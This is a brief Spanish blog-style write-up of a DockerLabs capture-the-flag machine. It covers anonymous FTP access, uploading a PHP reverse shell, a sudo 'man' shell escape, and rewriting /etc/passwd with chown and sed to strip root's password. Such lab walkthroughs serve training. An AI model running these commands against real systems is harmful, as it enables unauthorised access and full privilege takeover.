---
title: Dockerlabs
excerpt: WritheUp maquina de DockerLabs
publishDate: 'Sept 19 2024'
isFeatured: true
tags:
  - Web
  - Guide
  - CTF
seo:
  image:
    src: '/post-14.jpg'
    alt: Wavy lines
---

![Wavy lines](/post-14.jpg)



> Web frameworks are the architectural blueprints that empower developers to build the digital landscapes of tomorrow.



Entramos por ftp con usuario anonymous.
Nos conectamos desde el directorio Downloads en nuestra maquina atacante al host victima por ftp y subimos una reverse shell con ftp 

```
put  php-reverse-shell2.php
```

Ya adentro revisamos los usuarios con:
```
cat /etc/passwd | grep sh$
```

Revisamos los permiso que tenemos:



Con el comando sudo -u pingu man man abrimos un binario y ponemos !/bin/bash



Ahora somo el usuario pingu, repetimos el proceso:



Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:

`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`

Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.

`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`

Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba

`cp /tmp/passwd.tmp /etc/passwd`



Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña

